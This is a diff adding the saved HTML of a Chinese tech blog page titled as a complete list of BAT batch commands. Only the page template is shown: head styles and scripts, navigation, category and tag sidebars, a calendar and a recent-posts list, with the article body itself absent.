@@ -1,0 +1,954 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "https://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" lang="cn" xml:lang="cn">
+<head profile="http://gmpg.org/xfn/11"><meta charset="UTF-8">
+	<title>最全的BAT批处理命令大全 | Bruce's Blog</title> 
+<meta name="description" content=" ">
+<meta name="keywords" content="批处理">
+
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="shortcut icon" href="/wp-content/themes/WPCnblogs/favicon.ico" type="image/x-icon">
+	<link rel="stylesheet" type="text/css" href="/wp-content/themes/WPCnblogs/style.css">
+	<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.4.2/jquery.min.js" ></script>
+	<script type="text/javascript" src="/wp-content/themes/WPCnblogs/js/custom.js" ></script>
+	<script type="text/javascript" src="/wp-content/themes/WPCnblogs/comments-ajax.js"></script>
+    <link rel="stylesheet" id="enlighterjs-css" href="/wp-content/plugins/enlighter/static/enlighterjs.min.css" type="text/css" media="all">	
+<style id="global-styles-inline-css" type="text/css">
+:root{--wp--preset--aspect-ratio--square: 1;--wp--preset--aspect-ratio--4-3: 4/3;--wp--preset--aspect-ratio--3-4: 3/4;--wp--preset--aspect-ratio--3-2: 3/2;--wp--preset--aspect-ratio--2-3: 2/3;--wp--preset--aspect-ratio--16-9: 16/9;--wp--preset--aspect-ratio--9-16: 9/16;--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgb(6,147,227) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgb(252,185,0) 0%,rgb(255,105,0) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgb(255,105,0) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;--wp--preset--spacing--20: 0.44rem;--wp--preset--spacing--30: 0.67rem;--wp--preset--spacing--40: 1rem;--wp--preset--spacing--50: 1.5rem;--wp--preset--spacing--60: 2.25rem;--wp--preset--spacing--70: 3.38rem;--wp--preset--spacing--80: 5.06rem;--wp--preset--shadow--natural: 6px 6px 9px rgba(0, 0, 0, 0.2);--wp--preset--shadow--deep: 12px 12px 50px rgba(0, 0, 0, 0.4);--wp--preset--shadow--sharp: 6px 6px 0px rgba(0, 0, 0, 0.2);--wp--preset--shadow--outlined: 6px 6px 0px -3px rgb(255, 255, 255), 6px 6px rgb(0, 0, 0);--wp--preset--shadow--crisp: 6px 6px 0px rgb(0, 0, 0);}:where(.is-layout-flex){gap: 0.5em;}:where(.is-layout-grid){gap: 0.5em;}body .is-layout-flex{display: flex;}.is-layout-flex{flex-wrap: wrap;align-items: center;}.is-layout-flex > :is(*, div){margin: 0;}body .is-layout-grid{display: grid;}.is-layout-grid > :is(*, div){margin: 0;}:where(.wp-block-columns.is-layout-flex){gap: 2em;}:where(.wp-block-columns.is-layout-grid){gap: 2em;}:where(.wp-block-post-template.is-layout-flex){gap: 1.25em;}:where(.wp-block-post-template.is-layout-grid){gap: 1.25em;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+/*# sourceURL=global-styles-inline-css */
+</style>
+
+</head>
+
+<body>
+<div id="wrapper">
+	<div id="hd_info">
+		<div id="top-link">
+			<a title="收藏本站" href="#">收藏本站(ctrl+D)</a> | 
+			<a title="关于本站" target="_blank" href="/about/">关于本站</a>
+		</div>
+    </div>
+    <div id="header">  
+		<p class="h_r_3"></p><p class="h_r_2"></p><p class="h_r_1"></p>
+		<div id="header_block">
+			<div id="logo">
+				<h1><a href="/index.php" title="Bruce's Blog">
+				<img src="/wp-content/themes/WPCnblogs/images/logo.gif" alt="Code changes the world."></a>
+				</h1>
+			</div> 
+			<div class="clear"></div>
+		</div> 
+        <p class="h_r_1"></p><p class="h_r_2"></p><p class="h_r_3"></p>        
+    </div><!-- #header -->
+
+	<div id="nav_wrapper">
+        <div id="nav_block">
+			<ul>
+				<li class="current_page_item"><a href="/">首页</a></li>
+			    <li id="menu-item-3991" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3991"><a href="/category/net">编程开发</a></li>
+<li id="menu-item-3992" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3992"><a href="/category/sql-server">数据库</a></li>
+<li id="menu-item-3997" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3997"><a href="/category/jsjqureycss">前端之美</a></li>
+<li id="menu-item-3995" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3995"><a href="/category/systemarchitecture">架构师之路</a></li>
+<li id="menu-item-4064" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4064"><a href="/category/safe">安全</a></li>
+<li id="menu-item-5980" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-5980"><a href="/category/bigdata">大数据</a></li>
+<li id="menu-item-4066" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4066"><a href="/category/devops">DevOps</a></li>
+<li id="menu-item-4065" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4065"><a href="/category/test">测试</a></li>
+<li id="menu-item-3998" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3998"><a href="/category/subject">专题</a></li>
+<li id="menu-item-3994" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3994"><a href="/category/download">软件下载</a></li>
+<li id="menu-item-3996" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3996"><a href="/category/resourceshare">资源下载</a></li>
+<li id="menu-item-3993" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3993"><a href="/category/news">新闻资讯</a></li>
+<li id="menu-item-4013" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4013"><a href="/category/manager">每天一句管理学</a></li>
+<li id="menu-item-4014" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-4014"><a href="/category/startup">创业之路</a></li>
+<li id="menu-item-3988" class="menu-item menu-item-type-taxonomy menu-item-object-category menu-item-3988"><a href="/category/haha">程序员笑话</a></li>
+            </ul>
+		</div>
+    </div>
+    <div class="clear"></div>
+</div><!-- #nav -->
+
+
+<div id="side_nav"> 
+	<div id="cate_title_block">   
+		<div id="cate_title_title"><div class="cate_title">分类</div></div>
+		<ul id="cate_item">
+				<li class="cat-item cat-item-10"><a href="/category/net">.NET</a> (452)
+</li>
+	<li class="cat-item cat-item-6"><a href="/category/access">Access</a> (11)
+</li>
+	<li class="cat-item cat-item-2559"><a href="/category/ai-2">AI</a> (4)
+</li>
+	<li class="cat-item cat-item-13"><a href="/category/android">Android</a> (29)
+</li>
+	<li class="cat-item cat-item-2231"><a href="/category/angular">Angular</a> (2)
+</li>
+	<li class="cat-item cat-item-15"><a href="/category/cc">C/C++</a> (10)
+</li>
+	<li class="cat-item cat-item-1621"><a href="/category/crack">Crack</a> (11)
+</li>
+	<li class="cat-item cat-item-9"><a href="/category/dba">DBA</a> (5)
+</li>
+	<li class="cat-item cat-item-1709"><a href="/category/devops">DevOps</a> (77)
+</li>
+	<li class="cat-item cat-item-2171"><a href="/category/docker">Docker</a> (58)
+</li>
+	<li class="cat-item cat-item-1689"><a href="/category/download">Download</a> (23)
+</li>
+	<li class="cat-item cat-item-1620"><a href="/category/dump">Dump</a> (1)
+</li>
+	<li class="cat-item cat-item-2363"><a href="/category/game">Game</a> (3)
+</li>
+	<li class="cat-item cat-item-1688"><a href="/category/haha">Haha</a> (6)
+</li>
+	<li class="cat-item cat-item-1700"><a href="/category/ios">IOS</a> (1)
+</li>
+	<li class="cat-item cat-item-1885"><a href="/category/java">JAVA</a> (35)
+</li>
+	<li class="cat-item cat-item-2274"><a href="/category/k8s">k8s</a> (21)
+</li>
+	<li class="cat-item cat-item-12"><a href="/category/linux">LINUX</a> (104)
+</li>
+	<li class="cat-item cat-item-1719"><a href="/category/log">log</a> (2)
+</li>
+	<li class="cat-item cat-item-2195"><a href="/category/mac">MAC</a> (4)
+</li>
+	<li class="cat-item cat-item-1690"><a href="/category/manager">Manager</a> (7)
+</li>
+	<li class="cat-item cat-item-1060"><a href="/category/mongodb">MongoDB</a> (5)
+</li>
+	<li class="cat-item cat-item-1668"><a href="/category/mq">MQ</a> (8)
+</li>
+	<li class="cat-item cat-item-4"><a href="/category/mysql">MySQL</a> (114)
+</li>
+	<li class="cat-item cat-item-424"><a href="/category/news">News</a> (129)
+</li>
+	<li class="cat-item cat-item-1059"><a href="/category/nosql">NoSQL</a> (3)
+</li>
+	<li class="cat-item cat-item-5"><a href="/category/oracle">Oracle</a> (46)
+</li>
+	<li class="cat-item cat-item-1"><a href="/category/%E5%85%B6%E5%AE%83">Others</a> (358)
+</li>
+	<li class="cat-item cat-item-2172"><a href="/category/pcf">PCF</a> (1)
+</li>
+	<li class="cat-item cat-item-16"><a href="/category/phototshop">Phototshop</a> (9)
+</li>
+	<li class="cat-item cat-item-11"><a href="/category/php">PHP</a> (37)
+</li>
+	<li class="cat-item cat-item-1058"><a href="/category/postgresql">PostgreSQL</a> (3)
+</li>
+	<li class="cat-item cat-item-1062"><a href="/category/python">Python</a> (21)
+</li>
+	<li class="cat-item cat-item-1057"><a href="/category/redis">Redis</a> (11)
+</li>
+	<li class="cat-item cat-item-24"><a href="/category/resourceshare">ResourceShare</a> (101)
+</li>
+	<li class="cat-item cat-item-2022"><a href="/category/salesforce">Salesforce</a> (31)
+</li>
+	<li class="cat-item cat-item-3"><a href="/category/sql-server">SQL Server</a> (271)
+</li>
+	<li class="cat-item cat-item-7"><a href="/category/sqlite">SQLite</a> (14)
+</li>
+	<li class="cat-item cat-item-1691"><a href="/category/startup">Startup</a> (5)
+</li>
+	<li class="cat-item cat-item-652"><a href="/category/subject">Subject</a> (2)
+</li>
+	<li class="cat-item cat-item-2287"><a href="/category/unity3d">Unity3D</a> (22)
+</li>
+	<li class="cat-item cat-item-1529"><a href="/category/wordpress">Wordpress</a> (12)
+</li>
+	<li class="cat-item cat-item-2178"><a href="/category/cloud">云计算</a> (10)
+</li>
+	<li class="cat-item cat-item-1833"><a href="/category/ai">人工智能</a> (4)
+</li>
+	<li class="cat-item cat-item-2180"><a href="/category/dcs">分布式</a> (5)
+</li>
+	<li class="cat-item cat-item-14"><a href="/category/jsjqureycss">前端</a> (133)
+</li>
+	<li class="cat-item cat-item-1886"><a href="/category/blockchain">区块链</a> (3)
+</li>
+	<li class="cat-item cat-item-2721"><a href="/category/esp32">单片机</a> (1)
+</li>
+	<li class="cat-item cat-item-1877"><a href="/category/bigdata">大数据</a> (29)
+</li>
+	<li class="cat-item cat-item-1708"><a href="/category/safe">安全</a> (8)
+</li>
+	<li class="cat-item cat-item-2177"><a href="/category/microservice">微服务</a> (16)
+</li>
+	<li class="cat-item cat-item-1428"><a href="/category/test">测试</a> (3)
+</li>
+	<li class="cat-item cat-item-1659"><a href="/category/systemarchitecture">系统架构</a> (43)
+</li>
+	<li class="cat-item cat-item-2369"><a href="/category/synology">群晖</a> (20)
+</li>
+		</ul>
+	<div class="cate_bottom"></div>
+</div>
+
+<div class="l_s"></div>
+<p class="r_l_3"></p><p class="r_l_2"></p><p class="r_l_1"></p>
+
+<div class="w_l">
+	<h4>链接</h4>
+	<ul>
+		<li>· <a href="https://www.1bangong.com/" title="共享办公室" target="_blank">共享办公室</a></li>
+<li>· <a href="https://www.1bangong.com/" title="成都共享办公室" target="_blank">成都共享办公室</a></li>
+<li>· <a href="https://www.1bangong.com/" title="成都共享办公室" target="_blank">成都写字楼出租</a></li>
+<li>· <a href="https://www.1bangong.com/" title="成都办公室出租" target="_blank">成都办公室出租</a></li>
+<li>· <a href="https://chengduxiezilou.cn/" title="成都写字楼出租" target="_blank">成都写字楼出租</a></li>
+<li>· <a href="https://www.yqbg.cn/" title="成都共享办公室" target="_blank">成都共享办公室</a></li>
+	</ul>
+</div> 
+<p class="r_l_1"></p><p class="r_l_2"></p><p class="r_l_3"></p>
+
+</div><!-- #left sidebar -->
+
+<div id="side_right">
+	<div id="blogger_search">
+		
+<form method="get" id="searchform" action="/">
+	<input type="text" tabindex="3" value="搜索" class="input_blogger_search" name="s" id="s" onfocus="if (this.value == '搜索') {this.value = '';}" onblur="if (this.value == '') {this.value = '搜索';}">
+	<input type="button" value="找找看" class="search_btn" id="searchsubmit">
+</form>
+	</div>
+
+	<div class="w_r">
+		<div id="calendar_wrap">
+			<table id="wp-calendar" class="wp-calendar-table">
+	<caption>2012 年 3 月</caption>
+	<thead>
+	<tr>
+		<th scope="col" aria-label="星期一">一</th>
+		<th scope="col" aria-label="星期二">二</th>
+		<th scope="col" aria-label="星期三">三</th>
+		<th scope="col" aria-label="星期四">四</th>
+		<th scope="col" aria-label="星期五">五</th>
+		<th scope="col" aria-label="星期六">六</th>
+		<th scope="col" aria-label="星期日">日</th>
+	</tr>
+	</thead>
+	<tbody>
+	<tr>
+		<td colspan="3" class="pad"> </td><td><a href="/2012/03/01" aria-label="2012年3月1日 发布的文章">1</a></td><td><a href="/2012/03/02" aria-label="2012年3月2日 发布的文章">2</a></td><td><a href="/2012/03/03" aria-label="2012年3月3日 发布的文章">3</a></td><td><a href="/2012/03/04" aria-label="2012年3月4日 发布的文章">4</a></td>
+	</tr>
+	<tr>
+		<td><a href="/2012/03/05" aria-label="2012年3月5日 发布的文章">5</a></td><td><a href="/2012/03/06" aria-label="2012年3月6日 发布的文章">6</a></td><td><a href="/2012/03/07" aria-label="2012年3月7日 发布的文章">7</a></td><td><a href="/2012/03/08" aria-label="2012年3月8日 发布的文章">8</a></td><td><a href="/2012/03/09" aria-label="2012年3月9日 发布的文章">9</a></td><td><a href="/2012/03/10" aria-label="2012年3月10日 发布的文章">10</a></td><td><a href="/2012/03/11" aria-label="2012年3月11日 发布的文章">11</a></td>
+	</tr>
+	<tr>
+		<td><a href="/2012/03/12" aria-label="2012年3月12日 发布的文章">12</a></td><td>13</td><td>14</td><td><a href="/2012/03/15" aria-label="2012年3月15日 发布的文章">15</a></td><td><a href="/2012/03/16" aria-label="2012年3月16日 发布的文章">16</a></td><td><a href="/2012/03/17" aria-label="2012年3月17日 发布的文章">17</a></td><td><a href="/2012/03/18" aria-label="2012年3月18日 发布的文章">18</a></td>
+	</tr>
+	<tr>
+		<td><a href="/2012/03/19" aria-label="2012年3月19日 发布的文章">19</a></td><td><a href="/2012/03/20" aria-label="2012年3月20日 发布的文章">20</a></td><td><a href="/2012/03/21" aria-label="2012年3月21日 发布的文章">21</a></td><td><a href="/2012/03/22" aria-label="2012年3月22日 发布的文章">22</a></td><td><a href="/2012/03/23" aria-label="2012年3月23日 发布的文章">23</a></td><td><a href="/2012/03/24" aria-label="2012年3月24日 发布的文章">24</a></td><td><a href="/2012/03/25" aria-label="2012年3月25日 发布的文章">25</a></td>
+	</tr>
+	<tr>
+		<td><a href="/2012/03/26" aria-label="2012年3月26日 发布的文章">26</a></td><td><a href="/2012/03/27" aria-label="2012年3月27日 发布的文章">27</a></td><td><a href="/2012/03/28" aria-label="2012年3月28日 发布的文章">28</a></td><td><a href="/2012/03/29" aria-label="2012年3月29日 发布的文章">29</a></td><td><a href="/2012/03/30" aria-label="2012年3月30日 发布的文章">30</a></td><td><a href="/2012/03/31" aria-label="2012年3月31日 发布的文章">31</a></td>
+		<td class="pad" colspan="1"> </td>
+	</tr>
+	</tbody>
+	</table><nav aria-label="上个月及下个月" class="wp-calendar-nav">
+		<span class="wp-calendar-nav-prev"><a href="/2012/02">« 2 月</a></span>
+		<span class="pad"> </span>
+		<span class="wp-calendar-nav-next"><a href="/2012/04">4 月 »</a></span>
+	</nav>		</div>
+	</div>
+	
+	<div class="w_r">
+		<h4>近期文章</h4>
+		<ul>
+				<li><a href="/2026/03/31/cloud-function-python-sftp.html">在腾讯云函数中使用python打SFTP问题</a></li>
+	<li><a href="/2026/03/27/esp32.html">手握几十个ESP32的板子，我感觉我现在强得可怕！</a></li>
+	<li><a href="/2026/03/27/vscode-terminal-cmder.html">vscode修改终端terminal为Cmder</a></li>
+	<li><a href="/2025/12/11/svh-ios-saferi.html">一个神奇的svh：解决iOS saferi高度问题</a></li>
+	<li><a href="/2025/12/09/tonghuazhen-flac.html">陈一发儿-《童话镇》FLAC无损下载</a></li>
+	<li><a href="/2025/11/10/docker-insepct-logtail.html">docker insepct logtail</a></li>
+	<li><a href="/2025/11/06/wx-short-url-link.html">微信小程序开发中，通过API生成的体验版短链接，打开跳转到的是生产版</a></li>
+	<li><a href="/2025/10/17/confluence-chinese-error.html">解决confluence文件预览问题，中文乱码问题</a></li>
+	<li><a href="/2025/10/15/confluence-6-13-upgrade-to-confluence-7-19.html">confluence 6.13升级到confluence 7.19</a></li>
+	<li><a href="/2025/10/09/sharding-jdbc.html">Sharding-JDBC‌</a></li>
+		</ul>
+	</div>
+
+	<div class="w_r">
+		<h4>热门标签</h4>
+		<div id="tag-cloud"><a href="/tag/net-2" class="tag-cloud-link tag-link-19 tag-link-position-1" style="color:#13193d;font-size: 12px;;">.net</a>
+<a href="/tag/720p" class="tag-cloud-link tag-link-1053 tag-link-position-2" style="color:#3c8093;font-size: 12px;;">720p</a>
+<a href="/tag/1080p" class="tag-cloud-link tag-link-986 tag-link-position-3" style="color:#45a61f;font-size: 12px;;">1080P</a>
+<a href="/tag/android" class="tag-cloud-link tag-link-1541 tag-link-position-4" style="color:#9ce03f;font-size: 12px;;">Android</a>
+<a href="/tag/asp-net" class="tag-cloud-link tag-link-31 tag-link-position-5" style="color:#d719d7;font-size: 12px;;">asp.net</a>
+<a href="/tag/bt" class="tag-cloud-link tag-link-988 tag-link-position-6" style="color:#453032;font-size: 12px;;">BT</a>
+<a href="/tag/c" class="tag-cloud-link tag-link-30 tag-link-position-7" style="color:#ea496;font-size: 12px;;">c#</a>
+<a href="/tag/c%E5%A7%94%E6%89%98%E4%B8%8E%E4%BA%8B%E4%BB%B6" class="tag-cloud-link tag-link-87 tag-link-position-8" style="color:#f043cc;font-size: 12px;;">C#委托与事件</a>
+<a href="/tag/centos" class="tag-cloud-link tag-link-1165 tag-link-position-9" style="color:#1ee054;font-size: 12px;;">centos</a>
+<a href="/tag/clash" class="tag-cloud-link tag-link-2344 tag-link-position-10" style="color:#cf5ed0;font-size: 12px;;">clash</a>
+<a href="/tag/css" class="tag-cloud-link tag-link-1070 tag-link-position-11" style="color:#e52d23;font-size: 12px;;">CSS</a>
+<a href="/tag/datagridview" class="tag-cloud-link tag-link-25 tag-link-position-12" style="color:#2f955d;font-size: 12px;;">datagridview</a>
+<a href="/tag/docker" class="tag-cloud-link tag-link-1982 tag-link-position-13" style="color:#d7e3a8;font-size: 12px;;">docker</a>
+<a href="/tag/entity-framework" class="tag-cloud-link tag-link-389 tag-link-position-14" style="color:#d0d7c6;font-size: 12px;;">Entity Framework</a>
+<a href="/tag/hadoop" class="tag-cloud-link tag-link-1883 tag-link-position-15" style="color:#9ed32c;font-size: 12px;;">Hadoop</a>
+<a href="/tag/jquery" class="tag-cloud-link tag-link-39 tag-link-position-16" style="color:#f832d1;font-size: 12px;;">JQuery</a>
+<a href="/tag/js" class="tag-cloud-link tag-link-1108 tag-link-position-17" style="color:#a5403a;font-size: 12px;;">JS</a>
+<a href="/tag/k8s" class="tag-cloud-link tag-link-2186 tag-link-position-18" style="color:#5bd476;font-size: 12px;;">k8s</a>
+<a href="/tag/linq" class="tag-cloud-link tag-link-29 tag-link-position-19" style="color:#34370;font-size: 12px;;">LINQ</a>
+<a href="/tag/linq2db" class="tag-cloud-link tag-link-1764 tag-link-position-20" style="color:#77aafa;font-size: 12px;;">linq2db</a>
+<a href="/tag/linqtodb" class="tag-cloud-link tag-link-1763 tag-link-position-21" style="color:#440a33;font-size: 12px;;">LinqToDB</a>
+<a href="/tag/linux-2" class="tag-cloud-link tag-link-200 tag-link-position-22" style="color:#9d0962;font-size: 12px;;">Linux</a>
+<a href="/tag/mvc" class="tag-cloud-link tag-link-945 tag-link-position-23" style="color:#efb2cf;font-size: 12px;;">MVC</a>
+<a href="/tag/mysql" class="tag-cloud-link tag-link-1537 tag-link-position-24" style="color:#b32692;font-size: 12px;;">MySQL</a>
+<a href="/tag/nginx" class="tag-cloud-link tag-link-1168 tag-link-position-25" style="color:#c9cefa;font-size: 12px;;">nginx</a>
+<a href="/tag/oracle" class="tag-cloud-link tag-link-1538 tag-link-position-26" style="color:#c9565f;font-size: 12px;;">Oracle</a>
+<a href="/tag/python" class="tag-cloud-link tag-link-1544 tag-link-position-27" style="color:#1a1203;font-size: 12px;;">Python</a>
+<a href="/tag/redis" class="tag-cloud-link tag-link-1542 tag-link-position-28" style="color:#c9e578;font-size: 12px;;">Redis</a>
+<a href="/tag/remoting" class="tag-cloud-link tag-link-141 tag-link-position-29" style="color:#a47bb8;font-size: 12px;;">Remoting</a>
+<a href="/tag/salesforce" class="tag-cloud-link tag-link-2021 tag-link-position-30" style="color:#9cbb56;font-size: 12px;;">salesforce</a>
+<a href="/tag/springboot" class="tag-cloud-link tag-link-2308 tag-link-position-31" style="color:#380d7;font-size: 12px;;">springboot</a>
+<a href="/tag/sql" class="tag-cloud-link tag-link-20 tag-link-position-32" style="color:#b46955;font-size: 12px;;">sql</a>
+<a href="/tag/sql-server" class="tag-cloud-link tag-link-1536 tag-link-position-33" style="color:#a7f40;font-size: 12px;;">SQL Server</a>
+<a href="/tag/sql%E4%BC%98%E5%8C%96" class="tag-cloud-link tag-link-168 tag-link-position-34" style="color:#8c6462;font-size: 12px;;">SQL优化</a>
+<a href="/tag/unity" class="tag-cloud-link tag-link-2289 tag-link-position-35" style="color:#d20ba9;font-size: 12px;;">Unity</a>
+<a href="/tag/vs2010" class="tag-cloud-link tag-link-962 tag-link-position-36" style="color:#d988d3;font-size: 12px;;">VS2010</a>
+<a href="/tag/vue" class="tag-cloud-link tag-link-2247 tag-link-position-37" style="color:#b844c0;font-size: 12px;;">vue</a>
+<a href="/tag/wordpress" class="tag-cloud-link tag-link-79 tag-link-position-38" style="color:#6d308;font-size: 12px;;">WordPress</a>
+<a href="/tag/%E5%B0%8F%E7%A8%8B%E5%BA%8F" class="tag-cloud-link tag-link-2124 tag-link-position-39" style="color:#634702;font-size: 12px;;">小程序</a>
+<a href="/tag/%E6%94%B9%E5%96%84%E6%82%A8%E7%9A%84c%E7%A8%8B%E5%BA%8F" class="tag-cloud-link tag-link-694 tag-link-position-40" style="color:#f46cbb;font-size: 12px;;">改善您的C#程序</a>
+<a href="/tag/%E7%99%BE%E5%BA%A6%E4%BA%91" class="tag-cloud-link tag-link-1397 tag-link-position-41" style="color:#fbb336;font-size: 12px;;">百度云</a>
+<a href="/tag/%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98" class="tag-cloud-link tag-link-1411 tag-link-position-42" style="color:#ba0dd1;font-size: 12px;;">百度网盘</a>
+<a href="/tag/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%AC%91%E8%AF%9D" class="tag-cloud-link tag-link-58 tag-link-position-43" style="color:#699064;font-size: 12px;;">程序员笑话</a>
+<a href="/tag/%E7%B4%A2%E5%BC%95" class="tag-cloud-link tag-link-441 tag-link-position-44" style="color:#9ca37b;font-size: 12px;;">索引</a>
+<a href="/tag/%E7%BE%A4%E6%99%96" class="tag-cloud-link tag-link-2023 tag-link-position-45" style="color:#dc542d;font-size: 12px;;">群晖</a></div>
